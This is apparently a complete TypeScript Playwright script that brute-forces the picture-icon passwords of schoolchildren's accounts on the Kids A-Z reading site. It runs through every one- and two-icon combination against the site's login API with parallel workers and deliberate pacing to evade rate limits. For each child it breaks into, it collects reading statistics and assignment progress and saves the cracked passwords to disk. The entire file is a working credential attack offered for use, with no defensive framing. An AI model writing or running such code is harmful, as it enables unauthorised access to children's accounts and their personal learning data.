import * as fs from 'fs';
import * as path from 'path';
import { chromium, Browser, BrowserContext, Page } from 'playwright';
import { combinationToNames } from './probe/combinations';
import { ClassStudents, ProbeResult, VALID_CLASSES, ICON_NAMES } from './probe/types';

const BASE_URL = 'https://www.kidsa-z.com';
const DATA_DIR = path.join(process.cwd(), 'data', 'probe');
const CONCURRENCY = 4;
const API_DELAY_MS = 800;
const RATE_LIMIT_WAIT_MS = 6000;
const MAX_RETRIES = 2;
const LIVE_FILE = path.join(DATA_DIR, 'probe-live.json');

interface LiveWorkerState {
  workerId: number;
  className: string;
  screenName: string;
  currentCombo: number[];
  currentComboNames: string[];
  attempts: number;
  totalCombos: number;
  phase: '1digit' | '2digit';
  updatedAt: string;
}

let liveStates: LiveWorkerState[] = [];

function updateLiveState(state: LiveWorkerState) {
  const idx = liveStates.findIndex(s => s.workerId === state.workerId);
  if (idx >= 0) liveStates[idx] = state;
  else liveStates.push(state);
  try {
    fs.writeFileSync(LIVE_FILE, JSON.stringify(liveStates, null, 2));
  } catch {}
}

function clearLiveState(workerId: number) {
  liveStates = liveStates.filter(s => s.workerId !== workerId);
  try {
    fs.writeFileSync(LIVE_FILE, JSON.stringify(liveStates, null, 2));
  } catch {}
}

interface StudentTask {
  className: string;
  studentId: number;
  screenName: string;
}

interface ProbeResultFull extends ProbeResult {
  readingStats?: any;
  assignmentStatus?: any;
}

function sleep(ms: number): Promise<void> {
  return new Promise(resolve => setTimeout(resolve, ms));
}

function generateOptimizedCombinations(): { combos1: number[][]; combos2: number[][] } {
  const combos1: number[][] = [];
  const combos2: number[][] = [];

  for (let i = 1; i <= 18; i++) {
    combos1.push([i]);
  }

  const rabbitFirst: number[][] = [];
  const others: number[][] = [];

  for (let i = 1; i <= 18; i++) {
    for (let j = 1; j <= 18; j++) {
      if (j === i) continue;
      if (i === 1) {
        rabbitFirst.push([i, j]);
      } else {
        others.push([i, j]);
      }
    }
  }

  combos2.push(...rabbitFirst, ...others);

  return { combos1, combos2 };
}

async function createBrowserPage(): Promise<{ browser: Browser; context: BrowserContext; page: Page }> {
  const browser = await chromium.launch({
    headless: false,
    args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
  });

  const context = await browser.newContext({
    viewport: { width: 1280, height: 800 }
  });

  const page = await context.newPage();

  await page.goto(`${BASE_URL}/ng/`);
  await page.waitForTimeout(3000);

  const inputSelector = 'input[type="text"], input[name="username"], input[placeholder*="username" i], input[placeholder*="teacher" i]';
  await page.waitForSelector(inputSelector, { timeout: 15000 });
  await page.fill(inputSelector, VALID_CLASSES[0]);
  await page.keyboard.press('Enter');
  await page.waitForTimeout(4000);

  return { browser, context, page };
}

async function closeBrowserPage(bp: { browser: Browser; context: BrowserContext; page: Page } | null) {
  if (!bp) return;
  try { await bp.page.close(); } catch {}
  try { await bp.context.close(); } catch {}
  try { await bp.browser.close(); } catch {}
}

async function isPageAlive(page: Page): Promise<boolean> {
  try {
    await page.evaluate(() => 1);
    return true;
  } catch {
    return false;
  }
}

async function tryPassword(page: Page, studentId: number, className: string, iconicPassword: number[]): Promise<{
  status: number;
  accessGranted?: boolean;
  stars?: number;
  rateLimitRemaining: number;
}> {
  const result = await page.evaluate(async (data: {
    studentId: number;
    username: string;
    iconicPassword: number[];
  }) => {
    try {
      const response = await fetch('/ng/api/kids/tokens', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data),
        credentials: 'include'
      });

      const remaining = parseInt(response.headers.get('x-ratelimit-remaining') || '10', 10);
      const text = await response.text();
      let jsonData: any = null;
      try { jsonData = JSON.parse(text); } catch {}

      return {
        status: response.status,
        accessGranted: jsonData?.state?.accessGranted,
        stars: jsonData?.state?.user?.stars?.earnedStars,
        rateLimitRemaining: remaining,
      };
    } catch (e: any) {
      return { status: 0, rateLimitRemaining: 10 };
    }
  }, { studentId, username: className, iconicPassword });

  return result;
}

async function signOut(page: Page): Promise<void> {
  try {
    await page.evaluate(async () => {
      try {
        await fetch('/ng/api/kids/tokens/sign-out', { credentials: 'include' });
      } catch {}
    });
  } catch {}
}

async function probeStudent(page: Page, task: StudentTask, workerId: number): Promise<ProbeResultFull | null> {
  const { combos1, combos2 } = generateOptimizedCombinations();
  const totalCombos = combos1.length + combos2.length;
  let rateLimitRemaining = 10;
  let totalAttempts = 0;

  for (let i = 0; i < combos1.length; i++) {
    const combo = combos1[i];

    updateLiveState({
      workerId,
      className: task.className,
      screenName: task.screenName,
      currentCombo: combo,
      currentComboNames: combinationToNames(combo),
      attempts: totalAttempts,
      totalCombos,
      phase: '1digit',
      updatedAt: new Date().toISOString(),
    });

    if (rateLimitRemaining <= 2) {
      await sleep(RATE_LIMIT_WAIT_MS);
      rateLimitRemaining = 10;
    }

    const result = await tryPassword(page, task.studentId, task.className, combo);
    rateLimitRemaining = result.rateLimitRemaining;
    totalAttempts++;

    if (result.status === 429) {
      await sleep(RATE_LIMIT_WAIT_MS);
      rateLimitRemaining = 10;
      i--;
      continue;
    }

    if (result.accessGranted === true) {
      await signOut(page);
      return {
        className: task.className,
        studentId: task.studentId,
        screenName: task.screenName,
        passwordCombination: combo,
        passwordNames: combinationToNames(combo),
        loginStatus: 'success',
        earnedStars: result.stars,
        probeTimestamp: new Date().toISOString(),
        probeAttempts: totalAttempts,
      };
    }

    await sleep(API_DELAY_MS);
  }

  for (let i = 0; i < combos2.length; i++) {
    const combo = combos2[i];

    updateLiveState({
      workerId,
      className: task.className,
      screenName: task.screenName,
      currentCombo: combo,
      currentComboNames: combinationToNames(combo),
      attempts: totalAttempts,
      totalCombos,
      phase: '2digit',
      updatedAt: new Date().toISOString(),
    });

    if (rateLimitRemaining <= 2) {
      await sleep(RATE_LIMIT_WAIT_MS);
      rateLimitRemaining = 10;
    }

    const result = await tryPassword(page, task.studentId, task.className, combo);
    rateLimitRemaining = result.rateLimitRemaining;
    totalAttempts++;

    if (result.status === 429) {
      await sleep(RATE_LIMIT_WAIT_MS);
      rateLimitRemaining = 10;
      i--;
      continue;
    }

    if (result.accessGranted === true) {
      let readingStats: any = null;
      let assignmentStatus: any = null;

      try {
        readingStats = await page.evaluate(async () => {
          try {
            const resp = await fetch('/ng/api/kids/student/stats/primary-reading', { credentials: 'include' });
            const text = await resp.text();
            if (text.startsWith('{')) return JSON.parse(text);
            return null;
          } catch { return null; }
        });
      } catch {}

      try {
        assignmentStatus = await page.evaluate(async () => {
          try {
            const resp = await fetch('/ng/api/kids/student/reading/assignment/self-paced/status', { credentials: 'include' });
            const text = await resp.text();
            if (text.startsWith('{')) return JSON.parse(text);
            return null;
          } catch { return null; }
        });
      } catch {}

      await signOut(page);

      return {
        className: task.className,
        studentId: task.studentId,
        screenName: task.screenName,
        passwordCombination: combo,
        passwordNames: combinationToNames(combo),
        loginStatus: 'success',
        earnedStars: result.stars,
        readingStats: readingStats ? {
          readThisWeekCount: readingStats.readThisWeekCount,
          readLastWeekCount: readingStats.readLastWeekCount,
          listenCount: readingStats.listenCount,
          readCount: readingStats.readCount,
          quizCount: readingStats.quizCount,
          worksheetCount: readingStats.worksheetCount,
        } : undefined,
        assignmentStatus: assignmentStatus ? {
          currentLevel: assignmentStatus.currentLevel?.name,
          completedTasks: assignmentStatus.completedTasks,
          remainingTasks: assignmentStatus.remainingTasks,
          nextLevel: assignmentStatus.nextLevel?.name,
        } : undefined,
        probeTimestamp: new Date().toISOString(),
        probeAttempts: totalAttempts,
      };
    }

    if (totalAttempts % 30 === 0) {
      console.log(`    ${task.screenName}: ${totalAttempts} attempts, combo [${combo.join(',')}] = ${combinationToNames(combo).join('-')}...`);
    }

    await sleep(API_DELAY_MS);
  }

  return null;
}

async function main() {
  const targetClasses = process.argv[2]
    ? process.argv[2].split(',')
    : VALID_CLASSES;

  console.log(`=== Multi-Class Password Probe (API Mode v2) ===`);
  console.log(`  Classes: ${targetClasses.join(', ')}`);
  console.log(`  Concurrency: ${CONCURRENCY}`);
  console.log(`  API delay: ${API_DELAY_MS}ms`);
  console.log(`  Rate limit wait: ${RATE_LIMIT_WAIT_MS}ms`);
  console.log(`  Max retries per student: ${MAX_RETRIES}\n`);

  const studentsFile = path.join(DATA_DIR, 'all-class-students.json');
  if (!fs.existsSync(studentsFile)) {
    console.log('No student data found! Run fetch-all-class-students.ts first.');
    return;
  }

  const allClasses: ClassStudents[] = JSON.parse(fs.readFileSync(studentsFile, 'utf-8'));
  const targetClassData = allClasses.filter(c => targetClasses.includes(c.className));
  console.log(`  DEBUG: allClasses=${allClasses.length}, targetClassData=${targetClassData.length}, targets=${JSON.stringify(targetClasses)}`);
  console.log(`  DEBUG: allClassNames=${allClasses.map(c=>c.className).join(',')}`);

  const tasks: StudentTask[] = [];
  for (const cls of targetClassData) {
    for (const student of cls.students) {
      tasks.push({
        className: cls.className,
        studentId: student.studentId,
        screenName: student.screenName,
      });
    }
  }

  console.log(`  Total students to probe: ${tasks.length}\n`);

  const resultsFile = path.join(DATA_DIR, 'probe-results.json');
  const failedFile = path.join(DATA_DIR, 'probe-failed.json');

  let results: ProbeResultFull[] = [];
  let completedIds: Set<number> = new Set();
  let failedList: any[] = [];

  if (fs.existsSync(resultsFile)) {
    try {
      const saved = JSON.parse(fs.readFileSync(resultsFile, 'utf-8'));
      if (Array.isArray(saved)) {
        results = saved;
        completedIds = new Set(saved.map((r: any) => r.studentId));
      }
    } catch {}
  }
  if (fs.existsSync(failedFile)) {
    try {
      const saved = JSON.parse(fs.readFileSync(failedFile, 'utf-8'));
      if (Array.isArray(saved)) failedList = saved;
    } catch {}
  }

  const remainingTasks = tasks.filter(t => !completedIds.has(t.studentId));
  console.log(`  Already completed: ${completedIds.size}`);
  console.log(`  Remaining: ${remainingTasks.length}\n`);

  if (remainingTasks.length === 0) {
    console.log('All students already probed!');
    printSummary(results);
    return;
  }

  const startTime = Date.now();
  let processedCount = 0;

  const workerFn = async (workerId: number, taskQueue: StudentTask[]) => {
    let bp: { browser: Browser; context: BrowserContext; page: Page } | null = null;
    let retryCount = 0;

    const ensureBrowser = async () => {
      if (bp && await isPageAlive(bp.page)) return;
      console.log(`  [W${workerId}] Reinitializing browser...`);
      await closeBrowserPage(bp);
      bp = await createBrowserPage();
      console.log(`  [W${workerId}] Browser ready`);
    };

    try {
      await ensureBrowser();

      while (taskQueue.length > 0) {
        const task = taskQueue.shift();
        if (!task) break;

        if (completedIds.has(task.studentId)) continue;

        console.log(`  [W${workerId}] ${task.className}/${task.screenName}...`);

        let success = false;
        for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
          try {
            await ensureBrowser();

            const result = await probeStudent(bp!.page, task, workerId);

            if (result) {
              results.push(result);
              completedIds.add(task.studentId);
              clearLiveState(workerId);
              console.log(`  [W${workerId}] SUCCESS: ${task.screenName} = ${result.passwordNames?.join('-')} (stars: ${result.earnedStars}, attempts: ${result.probeAttempts})`);
              success = true;
            } else {
              clearLiveState(workerId);
              failedList.push({
                className: task.className,
                studentId: task.studentId,
                screenName: task.screenName,
                reason: 'All 1-digit and 2-digit combinations failed',
                timestamp: new Date().toISOString(),
              });
              console.log(`  [W${workerId}] FAILED: ${task.screenName} - all combos exhausted`);
              success = true;
            }
            break;
          } catch (e: any) {
            console.log(`  [W${workerId}] ERROR (attempt ${attempt + 1}): ${task.screenName}: ${e.message?.substring(0, 100)}`);
            bp = null;
            await sleep(2000);
          }
        }

        if (!success) {
          failedList.push({
            className: task.className,
            studentId: task.studentId,
            screenName: task.screenName,
            reason: 'Max retries exceeded',
            timestamp: new Date().toISOString(),
          });
          console.log(`  [W${workerId}] FAILED: ${task.screenName} - max retries exceeded`);
        }

        processedCount++;
        fs.writeFileSync(resultsFile, JSON.stringify(results, null, 2));
        fs.writeFileSync(failedFile, JSON.stringify(failedList, null, 2));

        const elapsed = (Date.now() - startTime) / 1000;
        const rate = processedCount / (elapsed / 60);
        const remaining = remainingTasks.length - processedCount;
        const eta = rate > 0 ? remaining / rate : 0;
        console.log(`  [W${workerId}] Progress: ${processedCount}/${remainingTasks.length} | ${results.length} success | ${rate.toFixed(1)}/min | ETA: ${eta.toFixed(0)}min`);

        await sleep(500);
      }
    } catch (e) {
      console.error(`  [W${workerId}] Worker error:`, e);
    } finally {
      await closeBrowserPage(bp);
    }
  };

  const taskQueue = [...remainingTasks];
  const workers = [];
  for (let w = 0; w < CONCURRENCY; w++) {
    workers.push(workerFn(w, taskQueue));
  }

  await Promise.all(workers);

  console.log(`\n${'='.repeat(60)}`);
  console.log(`  PROBE COMPLETE`);
  console.log(`${'='.repeat(60)}`);
  console.log(`  Time: ${((Date.now() - startTime) / 1000 / 60).toFixed(1)} minutes`);
  console.log(`  Total students: ${tasks.length}`);
  console.log(`  Success: ${results.length}`);
  console.log(`  Failed: ${failedList.length}`);

  printSummary(results);

  if (failedList.length > 0) {
    console.log(`\n  Failed students:`);
    for (const f of failedList) {
      console.log(`    ${f.className}/${f.screenName}: ${f.reason}`);
    }
  }
}

function printSummary(results: ProbeResultFull[]) {
  const byClass = new Map<string, ProbeResultFull[]>();
  for (const r of results) {
    if (!byClass.has(r.className)) byClass.set(r.className, []);
    byClass.get(r.className)!.push(r);
  }

  for (const [cls, clsResults] of byClass) {
    console.log(`\n  ${cls} (${clsResults.length} students):`);
    for (const r of clsResults) {
      console.log(`    ${r.screenName}: ${r.passwordNames?.join('-')} (stars: ${r.earnedStars ?? 'N/A'})`);
    }
  }
}

main().catch(console.error);
